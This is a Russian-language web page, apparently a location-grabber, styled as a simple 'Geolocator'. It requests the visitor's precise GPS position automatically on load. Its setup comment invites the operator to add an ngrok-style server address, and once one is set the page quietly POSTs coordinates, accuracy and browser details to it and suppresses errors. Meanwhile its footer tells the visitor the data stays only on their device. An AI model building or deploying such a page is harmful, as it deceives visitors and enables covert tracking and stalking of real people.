<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>📍 Геолокатор</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0d1117;
            color: #c9d1d9;
            font-family: Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }
        .card {
            background: #161b22;
            border: 1px solid #30363d;
            border-radius: 20px;
            padding: 30px 24px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.6);
            text-align: center;
        }
        .card h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 20px;
        }
        .card h1 span {
            color: #58a6ff;
        }
        .status-box {
            background: #0d1117;
            border: 1px solid #30363d;
            border-radius: 12px;
            padding: 20px 16px;
            margin-bottom: 24px;
            min-height: 100px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        .status-box .loader {
            display: inline-block;
            width: 28px;
            height: 28px;
            border: 3px solid #30363d;
            border-top: 3px solid #58a6ff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin-bottom: 10px;
        }
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
        .status-box .text {
            font-size: 15px;
            color: #8b949e;
        }
        .status-box .text.success {
            color: #3fb950;
        }
        .status-box .text.error {
            color: #f85149;
        }
        .status-box .coords {
            font-family: 'Courier New', monospace;
            font-size: 18px;
            color: #f0883e;
            margin-top: 6px;
            word-break: break-all;
        }
        .status-box .accuracy {
            font-size: 13px;
            color: #8b949e;
            margin-top: 4px;
        }
        .btn-group {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            justify-content: center;
        }
        .btn-group button {
            flex: 1;
            min-width: 100px;
            padding: 10px 12px;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
            color: #fff;
        }
        .btn-group .btn-primary {
            background: #238636;
        }
        .btn-group .btn-primary:hover {
            background: #2ea043;
        }
        .btn-group .btn-secondary {
            background: #21262d;
            border: 1px solid #30363d;
            color: #c9d1d9;
        }
        .btn-group .btn-secondary:hover {
            background: #30363d;
        }
        .btn-group .btn-danger {
            background: #da3633;
        }
        .btn-group .btn-danger:hover {
            background: #f85149;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #484f58;
            border-top: 1px solid #21262d;
            padding-top: 16px;
        }
        .footer a {
            color: #58a6ff;
            text-decoration: none;
            cursor: pointer;
        }
        .log-area {
            margin-top: 16px;
            background: #0d1117;
            border-radius: 8px;
            padding: 10px;
            max-height: 120px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
            color: #8b949e;
            border: 1px solid #21262d;
            display: none;
            text-align: left;
        }
        .log-area.show {
            display: block;
        }
        .log-area .entry {
            padding: 3px 0;
            border-bottom: 1px solid #161b22;
        }
    </style>
</head>
<body>

    <div class="card">
        <h1>📍 <span>Геолокатор</span></h1>

        <div class="status-box" id="statusBox">
            <div class="loader" id="loader"></div>
            <div class="text" id="statusText">Определение геолокации...</div>
            <div class="coords" id="coordsDisplay">—</div>
            <div class="accuracy" id="accuracyDisplay"></div>
        </div>

        <div class="btn-group">
            <button class="btn-primary" id="btnRefresh" onclick="getLocation()">🔄 Обновить</button>
            <button class="btn-secondary" onclick="copyCoords()">📋 Копировать</button>
            <button class="btn-danger" onclick="clearCoords()">🗑️ Очистить</button>
        </div>

        <div class="log-area" id="logArea">
            <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
                <span>📋 История</span>
                <button class="btn-secondary" style="flex:none; padding:2px 10px; font-size:11px;" onclick="copyLog()">Копировать всё</button>
            </div>
            <div id="logEntries"></div>
        </div>

        <div class="footer">
            ⚡ Данные только на этом устройстве •
            <a onclick="toggleLog()">Показать историю</a>
        </div>
    </div>

    <script>
        // ============================================================
        // ★★★★★  НАСТРОЙКА  ★★★★★
        // Вставь сюда свой адрес сервера (например, от ngrok)
        // Если сервера нет — оставь пустым, данные будут только на экране
        // ============================================================
        const SERVER_URL = "";  // пример: "https://abc123.ngrok.io/location"
        // ============================================================

        let lastCoords = null;
        let history = [];

        // ====== ГЕОЛОКАЦИЯ ======
        function getLocation() {
            const statusText = document.getElementById('statusText');
            const coordsDisplay = document.getElementById('coordsDisplay');
            const accuracyDisplay = document.getElementById('accuracyDisplay');
            const loader = document.getElementById('loader');
            const btn = document.getElementById('btnRefresh');

            statusText.textContent = '⏳ Запрос разрешения...';
            statusText.className = 'text';
            coordsDisplay.textContent = '—';
            accuracyDisplay.textContent = '';
            loader.style.display = 'inline-block';
            btn.disabled = true;

            if (!navigator.geolocation) {
                statusText.textContent = '❌ Браузер не поддерживает геолокацию';
                statusText.className = 'text error';
                loader.style.display = 'none';
                btn.disabled = false;
                return;
            }

            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const acc = pos.coords.accuracy;

                    lastCoords = { lat, lon, acc };
                    history.push({ lat, lon, acc, time: new Date().toLocaleTimeString() });

                    coordsDisplay.textContent = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
                    accuracyDisplay.textContent = `±${Math.round(acc)} м`;
                    statusText.textContent = '✅ Геолокация получена!';
                    statusText.className = 'text success';
                    loader.style.display = 'none';
                    btn.disabled = false;

                    // Отправка на сервер (если указан)
                    if (SERVER_URL) {
                        fetch(SERVER_URL, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                lat: lat,
                                lon: lon,
                                accuracy: acc,
                                device: navigator.userAgent,
                                timestamp: Date.now()
                            })
                        }).catch(() => {});
                    }

                    updateLog();
                },
                function(err) {
                    let msg = '';
                    switch (err.code) {
                        case 1:
                            msg = '❌ Доступ запрещён! Разрешите геолокацию в браузере.';
                            break;
                        case 2:
                            msg = '❌ Сигнал недоступен. Проверьте GPS/WiFi.';
                            break;
                        case 3:
                            msg = '❌ Таймаут. Попробуйте обновить страницу.';
                            break;
                        default:
                            msg = '❌ Ошибка: ' + err.message;
                    }
                    statusText.textContent = msg;
                    statusText.className = 'text error';
                    coordsDisplay.textContent = '—';
                    accuracyDisplay.textContent = '';
                    loader.style.display = 'none';
                    btn.disabled = false;
                }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
            );
        }

        // ====== КОПИРОВАТЬ ======
        function copyCoords() {
            if (!lastCoords) {
                alert('Нет координат для копирования');
                return;
            }
            const text = `${lastCoords.lat.toFixed(6)}, ${lastCoords.lon.toFixed(6)}`;
            navigator.clipboard?.writeText(text).then(() => {
                const btn = document.querySelector('.btn-secondary');
                const orig = btn.textContent;
                btn.textContent = '✅ Скопировано!';
                setTimeout(() => btn.textContent = orig, 1500);
            }).catch(() => {
                alert('Скопируйте вручную:\n' + text);
            });
        }

        // ====== ОЧИСТИТЬ ======
        function clearCoords() {
            if (!lastCoords && history.length === 0) return;
            lastCoords = null;
            history = [];
            document.getElementById('coordsDisplay').textContent = '—';
            document.getElementById('accuracyDisplay').textContent = '';
            document.getElementById('statusText').textContent = '🔄 Данные очищены';
            document.getElementById('statusText').className = 'text';
            document.getElementById('logEntries').innerHTML = '';
            document.getElementById('logArea').classList.remove('show');
        }

        // ====== ЛОГ ======
        function updateLog() {
            const entries = document.getElementById('logEntries');
            entries.innerHTML = history.map(h =>
                `<div class="entry">${h.time} → ${h.lat.toFixed(6)}, ${h.lon.toFixed(6)} (±${Math.round(h.acc)} м)</div>`
            ).join('');
        }

        function toggleLog() {
            const area = document.getElementById('logArea');
            area.classList.toggle('show');
            if (area.classList.contains('show')) updateLog();
        }

        function copyLog() {
            if (history.length === 0) {
                alert('Нет записей');
                return;
            }
            const text = history.map(h =>
                `${h.time} | ${h.lat.toFixed(6)}, ${h.lon.toFixed(6)} | ±${Math.round(h.acc)} м`
            ).join('\n');
            navigator.clipboard?.writeText(text).catch(() => {});
            alert('📋 История скопирована');
        }

        // ====== АВТОЗАПУСК ======
        window.onload = function() {
            try {
                const saved = sessionStorage.getItem('geo_history');
                if (saved) {
                    history = JSON.parse(saved);
                    if (history.length > 0) {
                        const last = history[history.length - 1];
                        lastCoords = { lat: last.lat, lon: last.lon, acc: last.acc };
                        document.getElementById('coordsDisplay').textContent =
                            `${last.lat.toFixed(6)}, ${last.lon.toFixed(6)}`;
                        document.getElementById('accuracyDisplay').textContent =
                            `±${Math.round(last.acc)} м (кеш)`;
                        document.getElementById('statusText').textContent = '📌 Из кеша';
                        document.getElementById('statusText').className = 'text';
                    }
                }
            } catch (e) {}

            setTimeout(getLocation, 500);
        };

        setInterval(() => {
            try {
                sessionStorage.setItem('geo_history', JSON.stringify(history));
            } catch (e) {}
        }, 3000);
    </script>

</body>
</html>
